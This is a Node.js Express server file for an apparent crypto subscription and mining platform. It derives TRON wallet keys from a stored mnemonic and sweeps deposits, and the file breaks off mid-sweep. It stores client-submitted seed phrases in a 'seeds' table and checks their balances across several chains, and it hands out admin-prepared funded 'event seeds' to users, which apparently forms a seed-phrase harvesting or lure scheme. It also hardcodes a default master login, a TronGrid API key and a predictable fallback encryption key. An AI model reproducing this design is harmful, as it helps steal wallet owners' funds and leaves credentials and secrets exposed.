const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const multer = require('multer');
// child_process는 더 이상 사용 안 함 (seed-checker.js require 방식으로 전환)

// seed-checker.js 에서 멀티체인 잔고 확인 함수 로드
const { checkMultiChainBalance } = require('./seed-checker');
const { HDNodeWallet } = require('ethers');
require('dotenv').config();

// ---------- TRON HD 주소 파생 유틸 ----------
const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

function base58Encode(buf) {
  let num = BigInt('0x' + buf.toString('hex'));
  const base = BigInt(58);
  let result = '';
  while (num > 0n) {
    result = BASE58_ALPHABET[Number(num % base)] + result;
    num = num / base;
  }
  for (let i = 0; i < buf.length && buf[i] === 0; i++) result = '1' + result;
  return result;
}

function ethAddressToTron(ethAddress) {
  const hex = ethAddress.replace('0x', '').toLowerCase();
  const raw = Buffer.from('41' + hex, 'hex');
  const h1 = crypto.createHash('sha256').update(raw).digest();
  const h2 = crypto.createHash('sha256').update(h1).digest();
  return base58Encode(Buffer.concat([raw, h2.slice(0, 4)]));
}

// ---------- 니모닉/xpub 암호화 저장 ----------
// .env에 WALLET_SECRET_KEY=<64자리 hex> 설정 권장
// 미설정 시 서버 재시작마다 키가 바뀌어 기존 니모닉 복호화 불가 → 반드시 .env에 고정값 설정
const _walletSecretKey = (() => {
  const envKey = process.env.WALLET_SECRET_KEY;
  if (envKey && envKey.length === 64) return Buffer.from(envKey, 'hex');
  console.warn('⚠️  WALLET_SECRET_KEY 미설정. 임시 키 사용 — .env에 64자리 hex 값을 설정하세요!');
  // 임시: 서버 시작 시 고정 fallback (운영에서는 반드시 .env 설정)
  return crypto.createHash('sha256').update('mynolab-wallet-key-fallback').digest();
})();

function encryptSecret(plaintext) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', _walletSecretKey, iv);
  const enc = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return `enc:${iv.toString('hex')}:${enc.toString('hex')}:${tag.toString('hex')}`;
}

function decryptSecret(stored) {
  if (!stored || !stored.startsWith('enc:')) return stored; // plain fallback
  const parts = stored.split(':');
  if (parts.length !== 4) return stored;
  const [, ivHex, encHex, tagHex] = parts;
  const decipher = crypto.createDecipheriv('aes-256-gcm', _walletSecretKey, Buffer.from(ivHex, 'hex'));
  decipher.setAuthTag(Buffer.from(tagHex, 'hex'));
  const dec = Buffer.concat([decipher.update(Buffer.from(encHex, 'hex')), decipher.final()]);
  return dec.toString('utf8');
}

// secret = 니모닉(12/24단어) 또는 xpub 키
// 니모닉: m/44'/195'/0'/0/index 경로로 TRON 주소 파생
// xpub: 자식 인덱스로 파생 (sweep 불가)
function deriveTronAddress(secret, index) {
  const plain = decryptSecret(secret);
  if (!plain) throw new Error('니모닉/xpub 키가 없습니다.');
  if (plain.startsWith('xpub') || plain.startsWith('xprv')) {
    const node = HDNodeWallet.fromExtendedKey(plain);
    return ethAddressToTron(node.deriveChild(index).address);
  }
  // 니모닉 → TRON 경로 m/44'/195'/0'/0/index
  const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/${index}`);
  return ethAddressToTron(wallet.address);
}

// 니모닉에서 개인키 파생 (sweep용)
function deriveTronPrivateKey(secret, index) {
  const plain = decryptSecret(secret);
  if (!plain) throw new Error('니모닉이 없습니다.');
  if (plain.startsWith('xpub')) throw new Error('xpub으로는 개인키 파생 불가 (sweep 불가). 니모닉을 입력하세요.');
  const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/${index}`);
  return wallet.privateKey.replace('0x', '');
}

// 니모닉에서 루트(m/44'/195'/0'/0) 개인키 파생 — TRX 선송금용
function deriveRootPrivateKey(secret) {
  const plain = decryptSecret(secret);
  if (!plain) throw new Error('니모닉이 없습니다.');
  if (plain.startsWith('xpub')) throw new Error('xpub은 루트 키 파생 불가');
  // 루트지갑 = 인덱스 0 (입금 주소는 1부터 시작)
  const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`);
  return wallet.privateKey.replace('0x', '');
}

// MariaDB 연결
const db = require('./db');
const axios = require('axios');
const cron = require('node-cron');

const app = express();
const PORT = process.env.PORT || 3000;

const MASTER_ID = process.env.MASTER_ID || 'tlarbwjd';
const MASTER_PW = process.env.MASTER_PW || 'tlarbwjd';

// ---------- DB 마이그레이션 ----------
async function runMigrations() {
  try {
    await db.pool.query(`
      ALTER TABLE managers
        ADD COLUMN IF NOT EXISTS tg_bot_token VARCHAR(300) DEFAULT NULL,
        ADD COLUMN IF NOT EXISTS tg_chat_id   VARCHAR(100) DEFAULT NULL
    `);
    console.log('✅ DB 마이그레이션: managers.tg_bot_token / tg_chat_id 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션 오류:', e.message);
  }
  try {
    // 마스터 알림봇 전용 테이블 (기존 settings 테이블과 분리)
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS master_settings (
        skey  VARCHAR(100) NOT NULL PRIMARY KEY,
        sval  TEXT         DEFAULT NULL
      )
    `);
    console.log('✅ DB 마이그레이션: master_settings 테이블 확인 완료');

    // 혹시 이전 버전에서 settings 테이블이 skey/sval 컬럼으로 잘못 생성된 경우 복구
    // settingDB 는 setting_key / setting_value 컬럼을 사용하므로 원래 구조로 재생성
    const [[colCheck]] = await db.pool.query(
      `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
       WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'settings' AND COLUMN_NAME = 'skey'`
    );
    if (colCheck) {
      // 잘못된 스키마(skey 컬럼 존재) → 삭제 후 올바른 구조로 재생성
      await db.pool.query('DROP TABLE settings');
      await db.pool.query(`
        CREATE TABLE settings (
          setting_key   VARCHAR(100) NOT NULL PRIMARY KEY,
          setting_value TEXT         DEFAULT NULL
        )
      `);
      console.log('✅ DB 마이그레이션: settings 테이블 스키마 복구 완료');
    } else {
      // 정상 구조 확인용 생성 (존재하면 무시)
      await db.pool.query(`
        CREATE TABLE IF NOT EXISTS settings (
          setting_key   VARCHAR(100) NOT NULL PRIMARY KEY,
          setting_value TEXT         DEFAULT NULL
        )
      `);
    }
  } catch (e) {
    console.error('DB 마이그레이션(settings) 오류:', e.message);
  }
  try {
    // 관리자가 준비해둔 이벤트 시드 목록 (클라이언트 제출 seeds 와 별개)
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS event_seeds (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        phrase      TEXT         NOT NULL COMMENT '시드 문구',
        note        VARCHAR(255) DEFAULT NULL COMMENT '메모',
        btc         DECIMAL(36,18) DEFAULT NULL,
        eth         DECIMAL(36,18) DEFAULT NULL,
        tron        DECIMAL(36,18) DEFAULT NULL,
        sol         DECIMAL(36,18) DEFAULT NULL,
        status      ENUM('available','assigned','cancelled') NOT NULL DEFAULT 'available',
        created_at  DATETIME     NOT NULL DEFAULT NOW(),
        INDEX idx_status (status)
      )
    `);
    console.log('✅ DB 마이그레이션: event_seeds 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(event_seeds) 오류:', e.message);
  }
  try {
    // 시드 지급 이력 테이블 (event_seeds → 유저)
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS seed_gifts (
        id           INT AUTO_INCREMENT PRIMARY KEY,
        event_seed_id INT          NOT NULL,
        user_id      VARCHAR(100) NOT NULL,
        phrase       TEXT         NOT NULL,
        note         VARCHAR(255) DEFAULT NULL,
        status       ENUM('pending','delivered','cancelled') NOT NULL DEFAULT 'pending',
        created_at   DATETIME     NOT NULL DEFAULT NOW(),
        delivered_at DATETIME     DEFAULT NULL,
        INDEX idx_user_status (user_id, status)
      )
    `);
    console.log('✅ DB 마이그레이션: seed_gifts 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(seed_gifts) 오류:', e.message);
  }
  // seed_gifts 테이블 컬럼 보강 (기존 테이블 대응)
  try {
    // event_seed_id 없으면 추가
    const [giftCols] = await db.pool.query("SHOW COLUMNS FROM seed_gifts LIKE 'event_seed_id'");
    if (giftCols.length === 0) {
      await db.pool.query("ALTER TABLE seed_gifts ADD COLUMN event_seed_id INT DEFAULT NULL AFTER id");
      console.log('✅ seed_gifts.event_seed_id 컬럼 추가됨');
    }
    // seed_id 가 NOT NULL 이면 nullable 로 변경 (구버전 스키마 대응)
    const [seedIdCols] = await db.pool.query("SHOW COLUMNS FROM seed_gifts LIKE 'seed_id'");
    if (seedIdCols.length > 0) {
      const col = seedIdCols[0];
      if (col.Null === 'NO') {
        await db.pool.query("ALTER TABLE seed_gifts MODIFY COLUMN seed_id INT DEFAULT NULL");
        console.log('✅ seed_gifts.seed_id → nullable 변경됨');
      }
    }
  } catch (e) {
    console.error('DB 마이그레이션(seed_gifts 컬럼) 오류:', e.message);
  }
  // seeds 테이블 컬럼 보강 (seed_checker.py 없이도 API가 동작하도록)
  try {
    const seedCols = [
      ['balance',      'DECIMAL(36,18) DEFAULT 0'],
      ['usdt_balance', 'DECIMAL(36,18) DEFAULT 0'],
      ['btc',          'DECIMAL(36,18) DEFAULT NULL'],
      ['eth',          'DECIMAL(36,18) DEFAULT NULL'],
      ['tron',         'DECIMAL(36,18) DEFAULT NULL'],
      ['sol',          'DECIMAL(36,18) DEFAULT NULL'],
      ['checked',      'TINYINT(1) DEFAULT 0'],
      ['checked_at',   'DATETIME NULL'],
    ];
    for (const [col, def] of seedCols) {
      const [rows] = await db.pool.query(`SHOW COLUMNS FROM seeds LIKE ?`, [col]);
      if (rows.length === 0) {
        await db.pool.query(`ALTER TABLE seeds ADD COLUMN ${col} ${def}`);
        console.log(`✅ DB 마이그레이션: seeds.${col} 컬럼 추가`);
      }
    }
    console.log('✅ DB 마이그레이션: seeds 테이블 컬럼 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(seeds 컬럼) 오류:', e.message);
  }

  // ===== macroUser 시스템 테이블 =====
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS mu_users (
        id            INT AUTO_INCREMENT PRIMARY KEY,
        name          VARCHAR(100) NOT NULL,
        login_id      VARCHAR(100) NOT NULL UNIQUE,
        password_hash VARCHAR(255) NOT NULL,
        role          ENUM('ADMIN','USER') NOT NULL DEFAULT 'USER',
        status        ENUM('active','inactive') NOT NULL DEFAULT 'active',
        created_at    DATETIME NOT NULL DEFAULT NOW(),
        updated_at    DATETIME NOT NULL DEFAULT NOW() ON UPDATE NOW()
      )
    `);
    console.log('✅ DB 마이그레이션: mu_users 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(mu_users) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS mu_sessions (
        id            INT AUTO_INCREMENT PRIMARY KEY,
        user_id       INT NOT NULL,
        token         VARCHAR(100) NOT NULL UNIQUE,
        last_activity DATETIME NOT NULL DEFAULT NOW(),
        INDEX idx_token (token),
        FOREIGN KEY (user_id) REFERENCES mu_users(id) ON DELETE CASCADE
      )
    `);
    console.log('✅ DB 마이그레이션: mu_sessions 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(mu_sessions) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS managed_accounts (
        id                       INT AUTO_INCREMENT PRIMARY KEY,
        owner_user_id            INT NOT NULL,
        account_name             VARCHAR(100) DEFAULT NULL,
        external_service_name    VARCHAR(100) DEFAULT NULL,
        login_id                 VARCHAR(100) DEFAULT NULL,
        login_password_encrypted TEXT         DEFAULT NULL,
        account_status           ENUM('PENDING','ACTIVE','SUSPENDED','EXPIRED','ERROR') NOT NULL DEFAULT 'PENDING',
        connection_status        ENUM('CONNECTED','DISCONNECTED','CHECKING') NOT NULL DEFAULT 'DISCONNECTED',
        last_checked_at          DATETIME     DEFAULT NULL,
        last_login_at            DATETIME     DEFAULT NULL,
        memo                     TEXT         DEFAULT NULL,
        created_at               DATETIME     NOT NULL DEFAULT NOW(),
        updated_at               DATETIME     NOT NULL DEFAULT NOW() ON UPDATE NOW(),
        INDEX idx_owner (owner_user_id),
        FOREIGN KEY (owner_user_id) REFERENCES mu_users(id) ON DELETE CASCADE
      )
    `);
    console.log('✅ DB 마이그레이션: managed_accounts 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(managed_accounts) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS managed_account_logs (
        id                  INT AUTO_INCREMENT PRIMARY KEY,
        managed_account_id  INT NOT NULL,
        event_type          VARCHAR(50)  DEFAULT NULL,
        message             TEXT         DEFAULT NULL,
        payload_json        TEXT         DEFAULT NULL,
        created_at          DATETIME     NOT NULL DEFAULT NOW(),
        INDEX idx_account (managed_account_id),
        FOREIGN KEY (managed_account_id) REFERENCES managed_accounts(id) ON DELETE CASCADE
      )
    `);
    console.log('✅ DB 마이그레이션: managed_account_logs 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(managed_account_logs) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS managed_account_tasks (
        id                  INT AUTO_INCREMENT PRIMARY KEY,
        managed_account_id  INT NOT NULL,
        task_type           VARCHAR(50)  DEFAULT NULL,
        task_status         ENUM('QUEUED','RUNNING','SUCCESS','FAILED') NOT NULL DEFAULT 'QUEUED',
        started_at          DATETIME     DEFAULT NULL,
        ended_at            DATETIME     DEFAULT NULL,
        result_message      TEXT         DEFAULT NULL,
        created_at          DATETIME     NOT NULL DEFAULT NOW(),
        INDEX idx_account (managed_account_id),
        FOREIGN KEY (managed_account_id) REFERENCES managed_accounts(id) ON DELETE CASCADE
      )
    `);
    console.log('✅ DB 마이그레이션: managed_account_tasks 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(managed_account_tasks) 오류:', e.message);
  }

  // ===== 채굴기 플랫폼 기능 =====
  try {
    await db.pool.query(`
      ALTER TABLE managers
        ADD COLUMN IF NOT EXISTS settlement_rate DECIMAL(5,2) NOT NULL DEFAULT 10.00 COMMENT '정산 비율 (%)'
    `);
    console.log('✅ DB 마이그레이션: managers.settlement_rate 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(managers.settlement_rate) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS miner_status (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        user_id     VARCHAR(50) NOT NULL UNIQUE COMMENT '사용자 ID',
        status      ENUM('running','stopped') NOT NULL DEFAULT 'stopped',
        coin_type   VARCHAR(20) NOT NULL DEFAULT 'BTC',
        assigned_at DATETIME DEFAULT NULL,
        updated_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_status (status)
      )
    `);
    console.log('✅ DB 마이그레이션: miner_status 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(miner_status) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS mining_records (
        id        INT AUTO_INCREMENT PRIMARY KEY,
        user_id   VARCHAR(50) NOT NULL,
        coin_type VARCHAR(20) NOT NULL DEFAULT 'BTC',
        amount    DECIMAL(20,8) NOT NULL DEFAULT 0,
        mined_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        note      TEXT DEFAULT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_user (user_id),
        INDEX idx_mined_at (mined_at)
      )
    `);
    console.log('✅ DB 마이그레이션: mining_records 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(mining_records) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS settlements (
        id                INT AUTO_INCREMENT PRIMARY KEY,
        manager_id        VARCHAR(50) NOT NULL,
        user_id           VARCHAR(50) NOT NULL,
        payment_amount    DECIMAL(20,8) NOT NULL,
        settlement_rate   DECIMAL(5,2) NOT NULL DEFAULT 0,
        settlement_amount DECIMAL(20,8) NOT NULL,
        payment_type      ENUM('new','renewal') NOT NULL DEFAULT 'new',
        created_at        DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_manager (manager_id),
        INDEX idx_user (user_id),
        INDEX idx_created (created_at)
      )
    `);
    console.log('✅ DB 마이그레이션: settlements 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(settlements) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS withdrawal_requests (
        id             INT AUTO_INCREMENT PRIMARY KEY,
        manager_id     VARCHAR(50) NOT NULL,
        amount         DECIMAL(20,8) NOT NULL,
        wallet_address VARCHAR(200) DEFAULT NULL,
        status         ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending',
        reject_reason  TEXT DEFAULT NULL,
        requested_at   DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        processed_at   DATETIME DEFAULT NULL,
        INDEX idx_manager (manager_id),
        INDEX idx_status (status),
        INDEX idx_requested (requested_at)
      )
    `);
    console.log('✅ DB 마이그레이션: withdrawal_requests 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(withdrawal_requests) 오류:', e.message);
  }

  // ===== 그룹 오너 계정 시스템 =====
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS account_owners (
        id         VARCHAR(50) NOT NULL PRIMARY KEY COMMENT '오너 계정 ID',
        pw         VARCHAR(255) NOT NULL COMMENT '비밀번호',
        name       VARCHAR(100) DEFAULT NULL COMMENT '표시 이름',
        telegram   VARCHAR(100) DEFAULT NULL COMMENT '메신저 ID',
        manager_id VARCHAR(50)  DEFAULT NULL COMMENT '담당 매니저 ID',
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_manager (manager_id)
      )
    `);
    console.log('✅ DB 마이그레이션: account_owners 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(account_owners) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS owner_sessions (
        token        VARCHAR(64) NOT NULL PRIMARY KEY,
        owner_id     VARCHAR(50) NOT NULL,
        last_activity DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_owner (owner_id)
      )
    `);
    console.log('✅ DB 마이그레이션: owner_sessions 테이블 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(owner_sessions) 오류:', e.message);
  }
  try {
    // account_owners 테이블에 status 컬럼 추가
    const [oCols] = await db.pool.query("SHOW COLUMNS FROM account_owners LIKE 'status'");
    if (oCols.length === 0) {
      await db.pool.query("ALTER TABLE account_owners ADD COLUMN status ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending' AFTER manager_id");
      console.log('✅ DB 마이그레이션: account_owners.status 컬럼 추가');
    } else {
      console.log('✅ DB 마이그레이션: account_owners.status 확인 완료');
    }
  } catch (e) {
    console.error('DB 마이그레이션(account_owners.status) 오류:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS bulk_payment_sessions (
        id               VARCHAR(64)    NOT NULL PRIMARY KEY,
        owner_id         VARCHAR(50)    NOT NULL,
        entries          TEXT           NOT NULL COMMENT 'JSON [{userId,days}]',
        target_date      DATE           NOT NULL,
        total_usdt       DECIMAL(12,4)  NOT NULL,
        deposit_address  VARCHAR(60)    DEFAULT NULL,
        wallet_version   INT            DEFAULT NULL,
        derivation_index INT            DEFAULT NULL,
        status           ENUM('pending','paid','complete','expired') NOT NULL DEFAULT 'pending',
        created_at       DATETIME       NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_bulk_status (status),
        INDEX idx_bulk_owner  (owner_id)
      )
    `);
    console.log('✅ DB 마이그레이션: bulk_payment_sessions 확인 완료');
  } catch (e) {
    console.error('DB 마이그레이션(bulk_payment_sessions) 오류:', e.message);
  }
  try {
    // users 테이블에 owner_id 컬럼 추가
    const [cols] = await db.pool.query("SHOW COLUMNS FROM users LIKE 'owner_id'");
    if (cols.length === 0) {
      await db.pool.query("ALTER TABLE users ADD COLUMN owner_id VARCHAR(50) DEFAULT NULL COMMENT '그룹 오너 계정 ID'");
      console.log('✅ DB 마이그레이션: users.owner_id 컬럼 추가');
    } else {
      console.log('✅ DB 마이그레이션: users.owner_id 확인 완료');
    }
  } catch (e) {
    console.error('DB 마이그레이션(users.owner_id) 오류:', e.message);
  }
}
runMigrations();

// ---------- 마스터 알림봇 헬퍼 ----------
async function getMasterTelegram() {
  try {
    const [[r1]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey = 'master_tg_bot_token'");
    const [[r2]] = await db.pool.query("SELECT sval FROM master_settings WHERE skey = 'master_tg_chat_id'");
    return { botToken: r1?.sval || null, chatId: r2?.sval || null };
  } catch (_) { return { botToken: null, chatId: null }; }
}
async function setMasterTelegram(botToken, chatId) {
  await db.pool.query(
    "INSERT INTO master_settings (skey, sval) VALUES ('master_tg_bot_token', ?) ON DUPLICATE KEY UPDATE sval = ?",
    [botToken || null, botToken || null]
  );
  await db.pool.query(
    "INSERT INTO master_settings (skey, sval) VALUES ('master_tg_chat_id', ?) ON DUPLICATE KEY UPDATE sval = ?",
    [chatId || null, chatId || null]
  );
}

// ---------- TRON RPC 노드 ----------
// TronGrid 무료 티어는 429(속도 제한)가 잦음 → 인증 불필요한 공개 노드 사용
const TRON_FULL_HOST = 'https://tron-rpc.publicnode.com';

// ---------- 텔레그램 알림 ----------
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// HTML 특수문자 이스케이프 (Telegram HTML 파싱 오류 방지)
function escapeHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// 최근 Telegram 에러 로그 (최대 20건, 관리자 진단용)
const _tgErrorLog = [];
function _pushTgError(entry) {
  _tgErrorLog.unshift(entry);
  if (_tgErrorLog.length > 20) _tgErrorLog.pop();
}

// throwOnError=true 이면 실패 시 예외 발생 (테스트 엔드포인트용)
// parseMode: 'HTML'(기본) | 'plain' (HTML 파싱 없이 전송)
async function sendTelegram(botToken, chatId, text, throwOnError = false, parseMode = 'HTML') {
  try {
    const body = { chat_id: chatId, text };
    if (parseMode === 'HTML') body.parse_mode = 'HTML';
    await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      body,
      { timeout: 8000 }
    );
    console.log(`[TELEGRAM] 전송 완료 → chatId=${chatId}`);
  } catch (e) {
    const desc = e.response?.data?.description || e.message;
    const errCode = e.response?.data?.error_code;
    console.error(`[TELEGRAM] 전송 실패 chatId=${chatId}: ${desc}`);
    _pushTgError({ time: new Date().toISOString(), chatId, error: desc, code: errCode });
    if (throwOnError) throw new Error(`Telegram 오류: ${desc}`);
  }
}

// ---------- 자동 스윕 & 구독 부여 ----------

const DEFAULT_PACKAGES = [
  { days: 30, price: 39 }, { days: 60, price: 75 },
  { days: 90, price: 110 }, { days: 180, price: 210 }, { days: 365, price: 390 },
];

async function calcDaysFromUsdt(usdtAmount) {
  // ⚠️ 테스트 모드: 금액 무관 30일 고정
  console.log(`[calcDays] 테스트 모드 — ${usdtAmount} USDT → 30일 고정`);
  return 30;

  /* 실제 운영 로직 (테스트 끝나면 위 두 줄 삭제 후 주석 해제)
  try {
    const raw = await db.settingDB.get('subscription_packages');
    const monthlyRaw = await db.settingDB.get('monthly_price_usdt');
    const packages = raw ? JSON.parse(raw) : DEFAULT_PACKAGES;
    const monthlyPrice = monthlyRaw ? Number(monthlyRaw) : 39;

    // 패키지 정확 매칭 (±5% 허용)
    const matched = packages
      .slice()
      .sort((a, b) => Math.abs(a.price - usdtAmount) - Math.abs(b.price - usdtAmount))[0];
    if (matched && Math.abs(matched.price - usdtAmount) / matched.price <= 0.05) {
      return matched.days;
    }
    // 비례 계산
    return Math.max(1, Math.floor((usdtAmount / monthlyPrice) * 30));
  } catch { return Math.max(1, Math.floor((usdtAmount / 39) * 30)); }
  */
}

const TRON_FULL_HOST_CALC = 'https://api.trongrid.io'; // 체인 파라미터 조회용
const USDT_ENERGY_NEEDED = 65_000; // USDT TRC20 전송에 필요한 에너지 추정치

// TRON 체인 파라미터에서 현재 에너지 단가를 조회해 필요한 TRX 계산
async function calcTrxNeeded() {
  try {
    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
    const resp = await axios.get(`${TRON_FULL_HOST_CALC}/wallet/getchainparameters`, {
      headers: { 'TRON-PRO-API-KEY': TRON_KEY },
      timeout: 8000
    });
    const params = resp.data?.chainParameter || [];
    const ep = params.find(p => p.key === 'getEnergyFee');
    const energyFee = ep?.value || 420; // sun / energy unit
    const trxRaw = Math.ceil((USDT_ENERGY_NEEDED * energyFee) / 1_000_000);
    const trxNeeded = Math.max(trxRaw + 2, 15); // +2 TRX bandwidth 버퍼, 최소 15
    console.log(`[TRX-CALC] 에너지 단가=${energyFee} sun → 필요 TRX=${trxNeeded}`);
    return trxNeeded;
  } catch (e) {
    console.warn('[TRX-CALC] 체인 파라미터 조회 실패, fallback=28:', e.message);
    return 28;
  }
}

const TRX_CONFIRM_WAIT_MS = 20_000; // TRX 전송 후 대기 (ms)

async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance) {
  console.log(`[AUTO-SWEEP] 시작: addr=${depositAddress} user=${userId} usdt=${usdtBalance}`);
  try {
    // 1. 활성 지갑 조회
    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet?.xpub_key) {
      console.warn('[AUTO-SWEEP] 활성 지갑/니모닉 없음 — 스킵'); return;
    }
    const rootAddress = activeWallet.root_wallet_address;

    // 2. 루트 / 입금주소 개인키 파생 (니모닉 필수 — xpub 불가)
    let rootPrivKey, depositPrivKey;
    try {
      rootPrivKey = deriveRootPrivateKey(activeWallet.xpub_key);
    } catch (e) {
      console.error('[AUTO-SWEEP] ❌ 루트 개인키 파생 실패:', e.message);
      console.error('[AUTO-SWEEP] ⚠️  관리자 페이지 > 지갑에서 xpub 대신 니모닉(12-24단어)으로 재등록 필요!');
      return;
    }
    const [[addrRow]] = await db.pool.query(
      'SELECT derivation_index FROM deposit_addresses WHERE deposit_address = ?',
      [depositAddress]
    );
    if (!addrRow) { console.warn('[AUTO-SWEEP] deposit_addresses 행 없음'); return; }
    try {
      depositPrivKey = deriveTronPrivateKey(activeWallet.xpub_key, addrRow.derivation_index);
    } catch (e) {
      console.error('[AUTO-SWEEP] ❌ 입금주소 개인키 파생 실패:', e.message);
      return;
    }

    const { TronWeb } = require('tronweb');
    const tronRoot = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: rootPrivKey });

    // ── 파생된 주소 vs DB 주소 일치 확인 ──
    const derivedRootAddr = tronRoot.defaultAddress.base58;
    if (derivedRootAddr !== rootAddress) {
      console.error(`[AUTO-SWEEP] ❌ 루트 주소 불일치!`);
      console.error(`  DB root_wallet_address : ${rootAddress}`);
      console.error(`  니모닉 인덱스0 파생 주소 : ${derivedRootAddr}`);
      console.error(`  → 관리자 페이지에서 root_wallet_address를 ${derivedRootAddr} 로 수정하거나 해당 주소의 니모닉을 재입력하세요.`);
      return;
    }
    console.log(`[AUTO-SWEEP] ✅ 루트 주소 확인: ${rootAddress}`);

    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';

    // 2.5. 입금 주소 실제 USDT 잔액 확인 (TRX 선송금 전에 먼저 확인 → 낭비 방지)
    let depositUsdtActual = 0;
    try {
      const depAcctResp = await axios.get(
        `https://api.trongrid.io/v1/accounts/${depositAddress}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, params: { only_confirmed: true }, timeout: 10000 }
      );
      const trc20 = depAcctResp.data?.data?.[0]?.trc20 || [];
      const entry = trc20.find(b => {
        const k = Object.keys(b)[0];
        return k && k.toLowerCase() === USDT_CONTRACT.toLowerCase();
      });
      depositUsdtActual = entry ? Number(Object.values(entry)[0]) / 1e6 : 0;
    } catch (e) {
      console.warn('[AUTO-SWEEP] 입금주소 USDT 잔액 조회 실패:', e.message);
    }
    if (depositUsdtActual < 0.1) {
      console.log(`[AUTO-SWEEP] 입금주소 실잔액 없음 (${depositUsdtActual.toFixed(4)} USDT) → swept 처리 후 종료`);
      await db.depositAddressDB.updateStatus(depositAddress, 'swept');
      return;
    }
    console.log(`[AUTO-SWEEP] 입금주소 실잔액 확인: ${depositUsdtActual.toFixed(4)} USDT`);

    // 3. 루트 지갑 TRX 잔액 확인 (TronGrid REST API 사용 — publicnode의 getBalance는 미활성 주소에서 에러 발생)
    let rootTrxBalance = 0;
    try {
      const balResp = await axios.get(
        `https://api.trongrid.io/v1/accounts/${rootAddress}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 10000 }
      );
      rootTrxBalance = (balResp.data?.data?.[0]?.balance || 0) / 1e6;
    } catch (e) {
      console.error('[AUTO-SWEEP] TRX 잔액 조회 실패:', e.message);
      return;
    }
    // 4. 필요한 TRX 동적 계산
    const trxNeeded = await calcTrxNeeded();
    if (rootTrxBalance < trxNeeded + 5) {
      console.error(`[AUTO-SWEEP] 루트 지갑 TRX 부족: ${rootTrxBalance} TRX (필요 ${trxNeeded + 5})`);
      return;
    }

    // 4-b. 입금 주소로 TRX 선송금
    console.log(`[AUTO-SWEEP] ${depositAddress}에 ${trxNeeded} TRX 전송 중... (계산값)`);
